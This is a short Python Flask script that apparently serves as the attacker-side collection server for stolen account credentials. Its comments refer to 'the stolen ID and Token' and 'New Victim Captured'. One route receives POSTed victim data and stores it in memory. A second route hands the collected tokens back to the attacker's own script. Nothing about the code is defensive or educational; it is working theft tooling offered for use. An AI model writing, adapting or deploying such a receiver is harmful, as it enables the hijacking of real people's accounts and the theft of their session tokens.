from flask import Flask, request, jsonify

app = Flask(__name__)

# This is a "temporary database" in the server's memory
database = []

@app.route('/capture', methods=['POST'])
def capture():
    data = request.get_json()
    # Add the stolen ID and Token to our list
    database.append(data)
    print(f"[*] New Victim Captured: {data}")
    return jsonify({"status": "success"}), 200

@app.route('/get-tokens', methods=['GET'])
def get_tokens():
    # This allows your Python script to "download" the list
    return jsonify(database)

if __name__ == "__main__":
    app.run()
